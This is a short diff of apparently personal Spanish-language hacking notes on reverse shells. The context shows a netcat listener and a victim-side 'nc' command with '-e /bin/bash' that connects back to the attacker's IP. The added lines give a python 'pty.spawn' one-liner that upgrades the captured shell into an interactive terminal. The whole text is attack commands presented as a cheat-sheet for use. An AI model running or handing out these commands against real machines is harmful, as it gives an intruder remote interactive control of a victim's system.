@@ -16,3 +16,6 @@ nc -lvp (puerto)
 
 #maquina victima se conecta
 nc (ip maquina atacante) (puerto) -e (ruta ej: /bin/bash)
+
+#para transformar nc en una terminal mas amigable python variara segun el que tenga la victima
+python3.5 -c 'import pty; pty.spawn("/bin/bash")'
